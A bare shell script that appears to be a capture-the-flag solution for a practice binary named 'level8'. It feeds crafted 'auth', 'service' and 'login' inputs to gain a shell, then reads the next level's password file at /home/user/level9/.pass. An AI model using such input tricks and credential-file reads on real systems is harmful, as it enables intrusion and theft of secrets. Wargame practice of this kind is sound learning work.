#!/bin/sh

(echo "auth 
serviceeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
login"; cat - < <(echo 'echo -n "flag is: "; cat /home/user/level9/.pass')) | ./level8

exit 0
